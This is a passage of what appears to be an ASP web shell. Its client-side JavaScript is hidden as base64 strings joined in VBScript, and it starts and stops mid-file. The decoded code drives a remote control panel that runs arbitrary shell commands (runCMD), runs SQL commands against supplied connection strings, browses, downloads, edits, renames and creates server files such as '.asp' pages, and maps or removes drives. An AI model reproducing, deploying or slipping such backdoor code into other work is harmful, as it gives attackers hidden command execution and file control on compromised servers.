"cnRCZWZvcmUoYWRkRmlsZVJvdyhpKSwgZ2V0SWQoInRibExpc3QiKS5sYXN0Q2hpbGQubmV4dFNpYmxpbmcpOwoJCX0KCX1lbHNlewoJCWdldElkKCJmaWxlTm8iKS5pbm5lckhUTUwgPSAiMCI7Cgl9Cn0KCmZ1bmN0aW9uIGFkZEZvbGRlclJvdyhpZCkgewoJCQluZXdSb3cgPSBhZGRUUihpZCwgImZvbGRlciIpOwoKCQkJbmV3" &_
"TGluayA9IGFkZExpbmsoZmZMaXN0LmZvbGRlcnNbaWRdLnNwbGl0KCJ8IilbMF0sICIiK2ZmTGlzdC5pbmZvLmZpbGVwYXRoKyIjRXhwbG9yZXJ8IitmZkxpc3QuaW5mby5wYXRoKyIiK2ZmTGlzdC5mb2xkZXJzW2lkXS5zcGxpdCgifCIpWzBdKyJcXCIpOwoJCQluZXdDb2wgPSBhZGRURCgiJm5ic3A7Jm5ic3A7PGltZyBzcmM9" &_
"Jz9tb2RlPWltYWdlJmltZ0lkPWRpcic+IiwgImticnRtIik7CgkJCWFkZEV2ZW50KG5ld0NvbCwgImNsaWNrIiwgY2hlY2tib3hNYW5hZ2VFdmVudCwgdHJ1ZSk7CgkJCWFkZEV2ZW50KG5ld0NvbCwgImRibGNsaWNrIiwgY2hlY2tib3hNYW5hZ2VFdmVudERCTCwgdHJ1ZSk7CgkJCW5ld0NvbC5hcHBlbmRDaGlsZChuZXdMaW5r" &_
"KTsKCgkJCW5ld1Jvdy5hcHBlbmRDaGlsZChuZXdDb2wpOwoJCQluZXdDb2wgPSBhZGRURCgiJm5ic3A7IiwgImticnRtIik7CgkJCWFkZEV2ZW50KG5ld0NvbCwgImNsaWNrIiwgY2hlY2tib3hNYW5hZ2VFdmVudCwgdHJ1ZSk7CgkJCW5ld1Jvdy5hcHBlbmRDaGlsZChuZXdDb2wpOwoJCQluZXdDb2wgPSBhZGRURCgiRElSIiwg" &_
"ImticnRtIiwgIiIsICJjZW50ZXIiKTsKCQkJYWRkRXZlbnQobmV3Q29sLCAiY2xpY2siLCBjaGVja2JveE1hbmFnZUV2ZW50LCB0cnVlKTsKCQkJbmV3Um93LmFwcGVuZENoaWxkKG5ld0NvbCk7CgkJCW5ld0NvbCA9IGFkZFREKGZmTGlzdC5mb2xkZXJzW2lkXS5zcGxpdCgifCIpWzFdLCAia2JydG0iLCAiIiwgImNlbnRlciIp" &_
"OwoJCQlhZGRFdmVudChuZXdDb2wsICJjbGljayIsIGNoZWNrYm94TWFuYWdlRXZlbnQsIHRydWUpOwoJCQluZXdSb3cuYXBwZW5kQ2hpbGQobmV3Q29sKTsKCQkJbmV3Q29sID0gYWRkVEQoZmZMaXN0LmZvbGRlcnNbaWRdLnNwbGl0KCJ8IilbMl0sICJrYnJ0bSIsICIiLCAiY2VudGVyIik7CgkJCWFkZEV2ZW50KG5ld0NvbCwg" &_
"ImNsaWNrIiwgY2hlY2tib3hNYW5hZ2VFdmVudCwgdHJ1ZSk7CgkJCW5ld1Jvdy5hcHBlbmRDaGlsZChuZXdDb2wpOwoJCQluZXdDb2wgPSBhZGRURCgiPGlucHV0IHR5cGU9J2NoZWNrYm94JyBjbGFzcz0neGNoZWNrJyBuYW1lPSdkeCcgb25DbGljaz0nY2hlY2tib3hNYW5hZ2UodGhpcyk7JyB2YWx1ZT0nIitpZCsiJz4iLCAi" &_
"a2JydG0gZmNoZWNrIiwgIiIsICJjZW50ZXIiKTsKCQkJYWRkRXZlbnQobmV3Q29sLCAiY2xpY2siLCBjaGVja2JveE1hbmFnZUV2ZW50LCB0cnVlKTsKCQkJbmV3Um93LmFwcGVuZENoaWxkKG5ld0NvbCk7CgkJCW5ld1Jvdy5hcHBlbmRDaGlsZChhZGRURCgiJm5ic3A7IiwgImticnRtIGZjb21tYW5kIiwgIiIsICJjZW50ZXIi" &_
"KSk7CgkJCW5ld1Jvdy5hcHBlbmRDaGlsZChhZGRURCgiPEEgaHJlZj1cImphdmFzY3JpcHQ6cmVuYW1lRm9sZGVyKCIraWQrIik7XCI+W1JlbmFtZV08L0E+IiwgImticnRtIGZjb21tYW5kIiwgIiIsICJjZW50ZXIiKSk7CgoJCQlyZXR1cm4gbmV3Um93Owp9CgpmdW5jdGlvbiBhZGRGaWxlUm93KGlkKSB7CgkJbmV3Um93ID0g" &_
"YWRkVFIoaWQsICJmaWxlIik7CgoJCW5ld0NvbCA9IGFkZFREKGNyZWF0SW1hZ2UoZmZMaXN0LmZpbGVzW2lkXS5zcGxpdCgifCIpWzBdKSwgImticnRtIik7CgkJYWRkRXZlbnQobmV3Q29sLCAiY2xpY2siLCBjaGVja2JveE1hbmFnZUV2ZW50LCB0cnVlKTsKCQlhZGRFdmVudChuZXdDb2wsICJkYmxjbGljayIsIGNoZWNrYm94" &_
"TWFuYWdlRXZlbnREQkwsIHRydWUpOwoJCW5ld1Jvdy5hcHBlbmRDaGlsZChuZXdDb2wpOwoKCQluZXdDb2wgPSBhZGRURCgiWzxmb250IGNvbG9yPXllbGxvdz4iK2ZmTGlzdC5maWxlc1tpZF0uc3BsaXQoInwiKVsxXSsiPC9mb250Pl0iLCAia2JydG0iLCAiIiwgImNlbnRlciIpOwoJCWFkZEV2ZW50KG5ld0NvbCwgImNsaWNr" &_
"IiwgY2hlY2tib3hNYW5hZ2VFdmVudCwgdHJ1ZSk7CgkJbmV3Um93LmFwcGVuZENoaWxkKG5ld0NvbCk7CgoJCW5ld0NvbCA9IGFkZFREKGZmTGlzdC5maWxlc1tpZF0uc3BsaXQoInwiKVsyXSwgImticnRtIiwgIiIsICJjZW50ZXIiKTsKCQlhZGRFdmVudChuZXdDb2wsICJjbGljayIsIGNoZWNrYm94TWFuYWdlRXZlbnQsIHRy" &_
"dWUpOwoJCW5ld1Jvdy5hcHBlbmRDaGlsZChuZXdDb2wpOwoKCQluZXdDb2wgPSBhZGRURChmZkxpc3QuZmlsZXNbaWRdLnNwbGl0KCJ8IilbM10sICJrYnJ0bSIsICIiLCAiY2VudGVyIik7CgkJYWRkRXZlbnQobmV3Q29sLCAiY2xpY2siLCBjaGVja2JveE1hbmFnZUV2ZW50LCB0cnVlKTsKCQluZXdSb3cuYXBwZW5kQ2hpbGQo" &_
"bmV3Q29sKTsKCgkJbmV3Q29sID0gYWRkVEQoZmZMaXN0LmZpbGVzW2lkXS5zcGxpdCgifCIpWzRdLCAia2JydG0iLCAiIiwgICJjZW50ZXIiKTsKCQlhZGRFdmVudChuZXdDb2wsICJjbGljayIsIGNoZWNrYm94TWFuYWdlRXZlbnQsIHRydWUpOwoJCW5ld1Jvdy5hcHBlbmRDaGlsZChuZXdDb2wpOwoKCQluZXdDb2wgPSBhZGRU" &_
"RCgiPGlucHV0IHR5cGU9J2NoZWNrYm94JyBjbGFzcz0neGNoZWNrJyBuYW1lPSdmeCcgb25DbGljaz0nY2hlY2tib3hNYW5hZ2UodGhpcyk7JyB2YWx1ZT0nIitpZCsiJz4iLCAia2JydG0gZmNoZWNrIiwgIiIsICJjZW50ZXIiKTsKCQlhZGRFdmVudChuZXdDb2wsICJjbGljayIsIGNoZWNrYm94TWFuYWdlRXZlbnQsIHRydWUp" &_
"OwoJCW5ld1Jvdy5hcHBlbmRDaGlsZChuZXdDb2wpOwoKCQluZXdDb2wgPSBhZGRURCgiPEEgaHJlZj0nP21vZGU9ZG93bmxvYWQmbG9jYXRpb249IiArIGZmTGlzdC5pbmZvLnBhdGggKyAiJmZpbGU9IitmZkxpc3QuZmlsZXNbaWRdLnNwbGl0KCJ8IilbMF0rIic+W0Rvd25sb2FkXTwvQT4iLCAia2JydG0gZmNvbW1hbmQiLCAi" &_
"IiwgImNlbnRlciIpOwoJCW5ld1Jvdy5hcHBlbmRDaGlsZChuZXdDb2wpOwoKCQluZXdSb3cuYXBwZW5kQ2hpbGQoYWRkVEQoIjxBIGhyZWY9XCJqYXZhc2NyaXB0OnJlbmFtZUZpbGUoIitpZCsiKTtcIj5bUmVuYW1lXTwvQT4iLCAia2JydG0gZmNvbW1hbmQiLCAiIiwgImNlbnRlciIpKTsKCgkJcmV0dXJuIG5ld1JvdzsKfQoK" &_
"ZnVuY3Rpb24gQ2hlY2tOYW1lKHN0cikgewoJdmFyIHJlOwoJcmUgPSAvW1xcLzoqPyI8PnxdL2dpOwoJaWYgKHJlLnRlc3Qoc3RyKSkgcmV0dXJuIGZhbHNlOwoJZWxzZSByZXR1cm4gdHJ1ZTsKfQoKZnVuY3Rpb24gY2hlY2tib3hNYW5hZ2VFdmVudERCTChlKQp7CglpZiAoIWUpIHZhciBlID0gd2luZG93LmV2ZW50OwoJaWQg" &_
"PSBlLnRhcmdldCB8fCBlLnNyY0VsZW1lbnQ7CglpZiAoaWQubm9kZVR5cGUgPT0gMykgaWQgPSBpZC5wYXJlbnROb2RlOwoKCWlmKGlkLnRhZ05hbWUudG9Mb3dlckNhc2UoKSA9PSAiYSIgfHwgaWQudGFnTmFtZS50b0xvd2VyQ2FzZSgpID09ICJpbnB1dCIpCgl7CgkJcmV0dXJuOwoJfQoKCXdoaWxlIChpZC5wYXJlbnROb2Rl" &_
"LnRhZ05hbWUudG9Mb3dlckNhc2UoKSAhPSAidHIiKQoJewoJCWlkID0gaWQucGFyZW50Tm9kZTsKCX0KCglpZihpZC5wYXJlbnROb2RlLmNoaWxkTm9kZXNbMl0uaW5uZXJIVE1MID09ICJESVIiKXsKCQlpZC5wYXJlbnROb2RlLmNoaWxkTm9kZXNbMF0uc2V0QXR0cmlidXRlKChpc0lFID8gJ2NsYXNzTmFtZScgOiAnY2xhc3Mn" &_
"KSwgJ2ticnRtJyk7CgkJaWQucGFyZW50Tm9kZS5jaGlsZE5vZGVzWzNdLnNldEF0dHJpYnV0ZSgoaXNJRSA/ICdjbGFzc05hbWUnIDogJ2NsYXNzJyksICdrYnJ0bScpOwoJCWlkLnBhcmVudE5vZGUuY2hpbGROb2Rlc1s0XS5zZXRBdHRyaWJ1dGUoKGlzSUUgPyAnY2xhc3NOYW1lJyA6ICdjbGFzcycpLCAna2JydG0nKTsKCQlp" &_
"ZC5wYXJlbnROb2RlLmNoaWxkTm9kZXNbNV0uc2V0QXR0cmlidXRlKChpc0lFID8gJ2NsYXNzTmFtZScgOiAnY2xhc3MnKSwgJ2ticnRtJyk7CgkJaWQucGFyZW50Tm9kZS5jaGlsZE5vZGVzWzVdLmZpcnN0Q2hpbGQuY2hlY2tlZCA9IGZhbHNlOwoJCXJlbmFtZUZvbGRlcihpZC5wYXJlbnROb2RlLmNoaWxkTm9kZXNbNV0uZmly" &_
"c3RDaGlsZC52YWx1ZSk7Cgl9ZWxzZXsKCQlpZC5wYXJlbnROb2RlLmNoaWxkTm9kZXNbMF0uc2V0QXR0cmlidXRlKChpc0lFID8gJ2NsYXNzTmFtZScgOiAnY2xhc3MnKSwgJ2ticnRtJyk7CgkJaWQucGFyZW50Tm9kZS5jaGlsZE5vZGVzWzNdLnNldEF0dHJpYnV0ZSgoaXNJRSA/ICdjbGFzc05hbWUnIDogJ2NsYXNzJyksICdr" &_
"YnJ0bScpOwoJCWlkLnBhcmVudE5vZGUuY2hpbGROb2Rlc1s0XS5zZXRBdHRyaWJ1dGUoKGlzSUUgPyAnY2xhc3NOYW1lJyA6ICdjbGFzcycpLCAna2JydG0nKTsKCQlpZC5wYXJlbnROb2RlLmNoaWxkTm9kZXNbNV0uc2V0QXR0cmlidXRlKChpc0lFID8gJ2NsYXNzTmFtZScgOiAnY2xhc3MnKSwgJ2ticnRtJyk7CgkJaWQucGFy" &_
"ZW50Tm9kZS5jaGlsZE5vZGVzWzVdLmZpcnN0Q2hpbGQuY2hlY2tlZCA9IGZhbHNlOwoJCXJlbmFtZUZpbGUoaWQucGFyZW50Tm9kZS5jaGlsZE5vZGVzWzVdLmZpcnN0Q2hpbGQudmFsdWUpOwoJfQp9CgpmdW5jdGlvbiBjaGVja2JveE1hbmFnZUV2ZW50KGUpCnsKCWlmICghZSkgdmFyIGUgPSB3aW5kb3cuZXZlbnQ7CglpZCA9" &_
"IGUudGFyZ2V0IHx8IGUuc3JjRWxlbWVudDsKCWlmIChpZC5ub2RlVHlwZSA9PSAzKSBpZCA9IGlkLnBhcmVudE5vZGU7CgoJaWYoaWQudGFnTmFtZS50b0xvd2VyQ2FzZSgpID09ICJhIiB8fCBpZC50YWdOYW1lLnRvTG93ZXJDYXNlKCkgPT0gImlucHV0IikKCXsKCQlyZXR1cm47Cgl9CgoJd2hpbGUgKGlkLnBhcmVudE5vZGUu" &_
"dGFnTmFtZS50b0xvd2VyQ2FzZSgpICE9ICJ0ciIpCgl7CgkJaWQgPSBpZC5wYXJlbnROb2RlOwoJfQoKCWlmKGlkLnBhcmVudE5vZGUuY2hpbGROb2Rlc1s1XS5maXJzdENoaWxkLmNoZWNrZWQpewoJCWlkLnBhcmVudE5vZGUuY2hpbGROb2Rlc1swXS5zZXRBdHRyaWJ1dGUoKGlzSUUgPyAnY2xhc3NOYW1lJyA6ICdjbGFzcycp" &_
"LCAna2JydG0nKTsKCQlpZC5wYXJlbnROb2RlLmNoaWxkTm9kZXNbM10uc2V0QXR0cmlidXRlKChpc0lFID8gJ2NsYXNzTmFtZScgOiAnY2xhc3MnKSwgJ2ticnRtJyk7CgkJaWQucGFyZW50Tm9kZS5jaGlsZE5vZGVzWzRdLnNldEF0dHJpYnV0ZSgoaXNJRSA/ICdjbGFzc05hbWUnIDogJ2NsYXNzJyksICdrYnJ0bScpOwoJCWlk" &_
"LnBhcmVudE5vZGUuY2hpbGROb2Rlc1s1XS5zZXRBdHRyaWJ1dGUoKGlzSUUgPyAnY2xhc3NOYW1lJyA6ICdjbGFzcycpLCAna2JydG0nKTsKCQlpZC5wYXJlbnROb2RlLmNoaWxkTm9kZXNbNV0uZmlyc3RDaGlsZC5jaGVja2VkID0gZmFsc2U7Cgl9ZWxzZXsKCQlpZC5wYXJlbnROb2RlLmNoaWxkTm9kZXNbMF0uc2V0QXR0cmli" &_
"dXRlKChpc0lFID8gJ2NsYXNzTmFtZScgOiAnY2xhc3MnKSwgJycpOwoJCWlkLnBhcmVudE5vZGUuY2hpbGROb2Rlc1szXS5zZXRBdHRyaWJ1dGUoKGlzSUUgPyAnY2xhc3NOYW1lJyA6ICdjbGFzcycpLCAnJyk7CgkJaWQucGFyZW50Tm9kZS5jaGlsZE5vZGVzWzRdLnNldEF0dHJpYnV0ZSgoaXNJRSA/ICdjbGFzc05hbWUnIDog" &_
"J2NsYXNzJyksICcnKTsKCQlpZC5wYXJlbnROb2RlLmNoaWxkTm9kZXNbNV0uc2V0QXR0cmlidXRlKChpc0lFID8gJ2NsYXNzTmFtZScgOiAnY2xhc3MnKSwgJycpOwoJCWlkLnBhcmVudE5vZGUuY2hpbGROb2Rlc1s1XS5maXJzdENoaWxkLmNoZWNrZWQgPSB0cnVlOwoJfQp9CgpmdW5jdGlvbiBjaGVja2JveE1hbmFnZShpZCkK" &_
"ewoJaWYoaWQuY2hlY2tlZCl7CgkJaWQucGFyZW50Tm9kZS5wYXJlbnROb2RlLmNoaWxkTm9kZXNbMF0uc2V0QXR0cmlidXRlKChpc0lFID8gJ2NsYXNzTmFtZScgOiAnY2xhc3MnKSwgJycpOwoJCWlkLnBhcmVudE5vZGUucGFyZW50Tm9kZS5jaGlsZE5vZGVzWzNdLnNldEF0dHJpYnV0ZSgoaXNJRSA/ICdjbGFzc05hbWUnIDog" &_
"J2NsYXNzJyksICcnKTsKCQlpZC5wYXJlbnROb2RlLnBhcmVudE5vZGUuY2hpbGROb2Rlc1s0XS5zZXRBdHRyaWJ1dGUoKGlzSUUgPyAnY2xhc3NOYW1lJyA6ICdjbGFzcycpLCAnJyk7CgkJaWQucGFyZW50Tm9kZS5wYXJlbnROb2RlLmNoaWxkTm9kZXNbNV0uc2V0QXR0cmlidXRlKChpc0lFID8gJ2NsYXNzTmFtZScgOiAnY2xh" &_
"c3MnKSwgJycpOwoJfWVsc2V7CgkJaWQucGFyZW50Tm9kZS5wYXJlbnROb2RlLmNoaWxkTm9kZXNbMF0uc2V0QXR0cmlidXRlKChpc0lFID8gJ2NsYXNzTmFtZScgOiAnY2xhc3MnKSwgJ2ticnRtJyk7CgkJaWQucGFyZW50Tm9kZS5wYXJlbnROb2RlLmNoaWxkTm9kZXNbM10uc2V0QXR0cmlidXRlKChpc0lFID8gJ2NsYXNzTmFt" &_
"ZScgOiAnY2xhc3MnKSwgJ2ticnRtJyk7CgkJaWQucGFyZW50Tm9kZS5wYXJlbnROb2RlLmNoaWxkTm9kZXNbNF0uc2V0QXR0cmlidXRlKChpc0lFID8gJ2NsYXNzTmFtZScgOiAnY2xhc3MnKSwgJ2ticnRtJyk7CgkJaWQucGFyZW50Tm9kZS5wYXJlbnROb2RlLmNoaWxkTm9kZXNbNV0uc2V0QXR0cmlidXRlKChpc0lFID8gJ2Ns" &_
"YXNzTmFtZScgOiAnY2xhc3MnKSwgJ2ticnRtJyk7Cgl9Cgp9CgpmdW5jdGlvbiBjaGVja0FsbChpZCkgewoJdmFyIGZtb2JqPWRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJpbnB1dCIpOwoJZm9yICh2YXIgaT0wOyBpPGZtb2JqLmxlbmd0aDtpKyspIHsKCQl2YXIgZT1mbW9ialtpXTsKCQlpZiAoKGUubmFtZSE9J2No" &_
"ZWNrYm94QWxsJykgJiYgKGUudHlwZT09J2NoZWNrYm94JykgJiYgKCFlLmRpc2FibGVkKSkgewoJCQllLnBhcmVudE5vZGUucGFyZW50Tm9kZS5jaGlsZE5vZGVzWzBdLnNldEF0dHJpYnV0ZSgoaXNJRSA/ICdjbGFzc05hbWUnIDogJ2NsYXNzJyksIChpZC5jaGVja2VkID8gJycgOiAna2JydG0nKSk7CgkJCWUucGFyZW50Tm9k" &_
"ZS5wYXJlbnROb2RlLmNoaWxkTm9kZXNbM10uc2V0QXR0cmlidXRlKChpc0lFID8gJ2NsYXNzTmFtZScgOiAnY2xhc3MnKSwgKGlkLmNoZWNrZWQgPyAnJyA6ICdrYnJ0bScpKTsKCQkJZS5wYXJlbnROb2RlLnBhcmVudE5vZGUuY2hpbGROb2Rlc1s0XS5zZXRBdHRyaWJ1dGUoKGlzSUUgPyAnY2xhc3NOYW1lJyA6ICdjbGFzcycp" &_
"LCAoaWQuY2hlY2tlZCA/ICcnIDogJ2ticnRtJykpOwoJCQllLnBhcmVudE5vZGUucGFyZW50Tm9kZS5jaGlsZE5vZGVzWzVdLnNldEF0dHJpYnV0ZSgoaXNJRSA/ICdjbGFzc05hbWUnIDogJ2NsYXNzJyksIChpZC5jaGVja2VkID8gJycgOiAna2JydG0nKSk7CgkJCWUuY2hlY2tlZD1pZC5jaGVja2VkOwoJCX0KCX0KCglpZiAo" &_
"aWQuY2hlY2tlZCkgewoJCWlkLnRpdGxlPSdDbGVhciBBbGwnOwoJfSBlbHNlIHsKCQlpZC50aXRsZT0nU2VsZWN0IEFsbCc7Cgl9Cn0KCmZ1bmN0aW9uIHNxbENvbW1hbmRDaGFuZ2UoKSB7CgoJaWYoZ2V0SWQoImNvbW1hbmRDaGFuZ2UiKS52YWx1ZSA9PSAiIDwtPiAiKQoJewoJCWdldElkKCJjb21tYW5kQ2hhbmdlIikudmFs" &_
"dWUgPSAiID4tPCAiOwoJCXNob3dkaXYoInR4dHNxbGNvbW1hbmQiLCB0cnVlKTsKCQlzaG93ZGl2KCJzcWxjb21tYW5kIiwgZmFsc2UpOwoJfQoJZWxzZXsKCQlnZXRJZCgiY29tbWFuZENoYW5nZSIpLnZhbHVlID0gIiA8LT4gIjsKCQlzaG93ZGl2KCJzcWxjb21tYW5kIiwgdHJ1ZSk7CgkJc2hvd2RpdigidHh0c3FsY29tbWFu" &_
"ZCIsIGZhbHNlKTsKCX0KCn0KCgpmdW5jdGlvbiBjbGVhckNvbnRlbnQoKQp7CglpZihnZXRJZCgidGJsTGlzdCIpKQoJCWdldElkKCJ0YmxDb250ZW50IikucmVtb3ZlQ2hpbGQoZ2V0SWQoInRibExpc3QiKSk7Cn0KCgovLyBNb2RlIC8vCmZ1bmN0aW9uIHJ1blNRTCgpCnsKCWlmKChnZXRJZCgic3FsY29ubmVjdGlvbiIpLnZh" &_
"bHVlLnRyaW0oKSAhPSAiIikgJiYgKCgoZ2V0SWQoImNvbW1hbmRDaGFuZ2UiKS52YWx1ZSA9PSAiIDwtPiAiKSAmJiAoZ2V0SWQoInNxbGNvbW1hbmQiKS52YWx1ZS50cmltKCkgIT0gIiIpKSB8fCAoKGdldElkKCJjb21tYW5kQ2hhbmdlIikudmFsdWUgPT0gIiA+LTwgIikgJiYgKGdldElkKCJ0eHRzcWxjb21tYW5kIikudmFs" &_
"dWUudHJpbSgpICE9ICIiKSkpKXsKCQlrZXk9WyJjb25uZWN0aW9uIiwgImNvbW1hbmQiXTsKCQl2YWx1ZT1bZ2V0SWQoInNxbGNvbm5lY3Rpb24iKS52YWx1ZSwgKGdldElkKCJjb21tYW5kQ2hhbmdlIikudmFsdWUgPT0gIiA8LT4gIikgPyBnZXRJZCgic3FsY29tbWFuZCIpLnZhbHVlIDogZ2V0SWQoInR4dHNxbGNvbW1hbmQi" &_
"KS52YWx1ZV07CgkJc2VuZFJlcXVlc3RBY3Rpb24oInJ1blNRTCIsIFtrZXksIHZhbHVlXSk7Cgl9ZWxzZXsKCQlhbGVydCgiQ29ubmVjdGlvbiBTdHJpbmcgYW5kIFNRTCBDb21tYW5kIGFyZSByZXF1aXJlZCAhIik7Cgl9Cn0KCmZ1bmN0aW9uIHJ1bkNNRCgpCnsKCWlmKGdldElkKCJ2Y29tbWFuZCIpLnZhbHVlLnRyaW0oKSAh" &_
"PSAiIil7CgkJa2V5PVsiY29tbWFuZCJdOwoJCXZhbHVlPVtnZXRJZCgidmNvbW1hbmQiKS52YWx1ZV07CgkJc2VuZFJlcXVlc3RBY3Rpb24oInJ1bkNNRCIsIFtrZXksIHZhbHVlXSk7Cgl9ZWxzZXsKCQlhbGVydCgiQ29tbWFuZCBpcyByZXF1aXJlZCAhIik7Cgl9Cn0KCmZ1bmN0aW9uIGxvYWRGaWxlKCkKewoJa2V5PVsiaXRl" &_
"bVBhdGgiXTsKCXZhbHVlPVtnZXRWYXIod2luZG93LmxvY2F0aW9uLmhyZWYsMSldOwoJc2VuZFJlcXVlc3RBY3Rpb24oImxvYWRGaWxlIiwgW2tleSwgdmFsdWVdKTsKfQoKZnVuY3Rpb24gc2F2ZUZpbGUoaVN0YXJ0KQp7CglpZighaVN0YXJ0KSBpU3RhcnQ9MDsKCgl2YXIgaXRlbUNvbnRlbnQgPSBnZXRJZCgidHh0Q29udGVu" &_
"dCIpLnZhbHVlOwoJa2V5PVsiaXRlbVBhdGgiLCAiaXRlbUNvbnRlbnQiLCAic2F2ZU1vZGUiXTsKCWlmKGN1cnJlbnRfcnVubmluZyA9PSBmYWxzZSl7CgkJdmFsdWU9W2dldFZhcih3aW5kb3cubG9jYXRpb24uaHJlZiwxKSwgaXRlbUNvbnRlbnQuc3Vic3RyaW5nKGlTdGFydCwoaXRlbUNvbnRlbnQubGVuZ3RoID4gaVN0YXJ0" &_
"KzUxMjAwKSA/IGlTdGFydCs1MTIwMCA6IGl0ZW1Db250ZW50Lmxlbmd0aCksIChpU3RhcnQ9PTApID8gMiA6IDhdOwoJCXNlbmRSZXF1ZXN0QWN0aW9uKCJzYXZlRmlsZSIsIFtrZXksIHZhbHVlXSk7CgoJCWlmKGlTdGFydCs1MTIwMCA8IGl0ZW1Db250ZW50Lmxlbmd0aCl7CgkJCWlTdGFydCArPSA1MTIwMDsKCQkJc2F2ZVRp" &_
"bWVyID0gc2V0VGltZW91dCgic2F2ZUZpbGUoIiArIGlTdGFydCArICIpOyIsIDEwMCk7CgkJfWVsc2V7CgkJCXNhdmVUaW1lciA9IGZhbHNlOwoJCX0KCX1lbHNlewoJCXNhdmVUaW1lciA9IHNldFRpbWVvdXQoInNhdmVGaWxlKCIgKyBpU3RhcnQgKyAiKTsiLCAxMDApOwoJfQp9CgpmdW5jdGlvbiByZW5hbWVGaWxlKGlkKQp7" &_
"CiAgIGlmKGZmTGlzdC5maWxlc1tpZF0pCiAgIHsKCQlwb3NFeHAgPSBjdXJfcG9zKCk7CgkJc3RyID0gcHJvbXB0KCJQbGVhc2UgZW50ZXIgbmV3IG5hbWUgZm9yIHRoZSBmaWxlIiwgZmZMaXN0LmZpbGVzW2lkXS5zcGxpdCgifCIpWzBdKTsKCQlpZiAoIXN0ciB8fCAoc3RyPT1mZkxpc3QuZmlsZXNbaWRdLnNwbGl0KCJ8Iilb" &_
"MF0pKSByZXR1cm47CgkJaWYgKCFDaGVja05hbWUoc3RyKSkge2FsZXJ0KCJGaWxlIG5hbWUgY2FuIG5vdCBjb250YWluIGFueSBvZiB0aGVcbmZvbGxvd2luZyBjaGFyYWN0ZXJzOiBcXCAvIDogKiA/IFwiIDwgPiB8Iik7IHJldHVybjt9CgoJCWtleT1bImZpbGVJZCIsICJmaWxlTmFtZSIsICJuZXdOYW1lIl07CgkJdmFsdWU9" &_
"W2lkLCBmZkxpc3QuZmlsZXNbaWRdLnNwbGl0KCJ8IilbMF0sIHN0cl07CgkJc2VuZFJlcXVlc3RBY3Rpb24oInJlbmFtZUZpbGUiLCBba2V5LCB2YWx1ZV0pOwogICB9Cn0KCmZ1bmN0aW9uIHJlbmFtZUZvbGRlcihpZCkKewogICBpZihmZkxpc3QuZm9sZGVyc1tpZF0pCiAgIHsKCQlwb3NFeHAgPSBjdXJfcG9zKCk7CgkJc3Ry" &_
"ID0gcHJvbXB0KCJQbGVhc2UgZW50ZXIgbmV3IG5hbWUgZm9yIHRoZSBmb2xkZXIiLCBmZkxpc3QuZm9sZGVyc1tpZF0uc3BsaXQoInwiKVswXSk7CgkJaWYgKCFzdHIgfHwgKHN0cj09ZmZMaXN0LmZvbGRlcnNbaWRdLnNwbGl0KCJ8IilbMF0pKSByZXR1cm47CgkJaWYgKCFDaGVja05hbWUoc3RyKSkge2FsZXJ0KCJGb2xkZXIg" &_
"bmFtZSBjYW4gbm90IGNvbnRhaW4gYW55IG9mIHRoZVxuZm9sbG93aW5nIGNoYXJhY3RlcnM6IFxcIC8gOiAqID8gXCIgPCA+IHwiKTsgcmV0dXJuO30KCgkJa2V5PVsiZm9sZGVySWQiLCAiZm9sZGVyTmFtZSIsICJuZXdOYW1lIl07CgkJdmFsdWU9W2lkLCBmZkxpc3QuZm9sZGVyc1tpZF0uc3BsaXQoInwiKVswXSwgc3RyXTsK" &_
"CQlzZW5kUmVxdWVzdEFjdGlvbigicmVuYW1lRm9sZGVyIiwgW2tleSwgdmFsdWVdKTsKICAgfQp9CgpmdW5jdGlvbiBuZXdGaWxlKCkKewoJcG9zRXhwID0gY3VyX3BvcygpOwoJc3RyID0gcHJvbXB0KCJQbGVhc2UgZW50ZXIgbmFtZSBmb3IgdGhlIG5ldyBmaWxlIiwgIm5ldy5hc3AiKTsKCWlmICghc3RyKSByZXR1cm47Cglp" &_
"ZiAoIUNoZWNrTmFtZShzdHIpKSB7YWxlcnQoIkZpbGUgbmFtZSBjYW4gbm90IGNvbnRhaW4gYW55IG9mIHRoZVxuZm9sbG93aW5nIGNoYXJhY3RlcnM6IFxcIC8gOiAqID8gXCIgPCA+IHwiKTsgcmV0dXJuO30KCglrZXk9WyJpdGVtTmFtZSJdOwoJdmFsdWU9W3N0cl07CglzZW5kUmVxdWVzdEFjdGlvbigibmV3RmlsZSIsIFtr" &_
"ZXksIHZhbHVlXSk7Cn0KCmZ1bmN0aW9uIG5ld0ZvbGRlcigpCnsKCXBvc0V4cCA9IGN1cl9wb3MoKTsKCXN0ciA9IHByb21wdCgiUGxlYXNlIGVudGVyIG5hbWUgZm9yIHRoZSBuZXcgZm9sZGVyIiwgIk5ldyBGb2xkZXIiKTsKCWlmICghc3RyKSByZXR1cm47CglpZiAoIUNoZWNrTmFtZShzdHIpKSB7YWxlcnQoIkZvbGRlciBu" &_
"YW1lIGNhbiBub3QgY29udGFpbiBhbnkgb2YgdGhlXG5mb2xsb3dpbmcgY2hhcmFjdGVyczogXFwgLyA6ICogPyBcIiA8ID4gfCIpOyByZXR1cm47fQoKCWtleT1bIml0ZW1OYW1lIl07Cgl2YWx1ZT1bc3RyXTsKCXNlbmRSZXF1ZXN0QWN0aW9uKCJuZXdGb2xkZXIiLCBba2V5LCB2YWx1ZV0pOwp9CgoKZnVuY3Rpb24gcmVtb3Zl" &_
"RHJpdmVyKGRyaXZlckxldHRlcikKewogICBpZihkcml2ZXJMZXR0ZXIpCiAgIHsKCQlpZiAoIWNvbmZpcm0oJ0FyZSB5b3Ugc3VyZSB0byByZW1vdmUgZHJpdmVyICcgKyBkcml2ZXJMZXR0ZXIgKyAnOiA/JykpIHJldHVybjsKCgkJcG9zRXhwID0gY3VyX3BvcygpOwoKCQlrZXk9WyJkcml2ZXJMZXR0ZXIiXTsKCQl2YWx1ZT1b" &_
"ZHJpdmVyTGV0dGVyXTsKCQlzZW5kUmVxdWVzdEFjdGlvbigicmVtb3ZlRHJpdmVyIiwgW2tleSwgdmFsdWVdKTsKICAgfQp9CgpmdW5jdGlvbiBtYXBEcml2ZXIoKQp7CglpZiAoZ2V0SWQoImRyaXZlckxldHRlciIpLnZhbHVlLnRyaW0oKS5sZW5ndGggPCAxKSB7YWxlcnQoIkRyaXZlciBMZXR0ZXIgaXMgcmVxdWlyZWQgISIp" &_
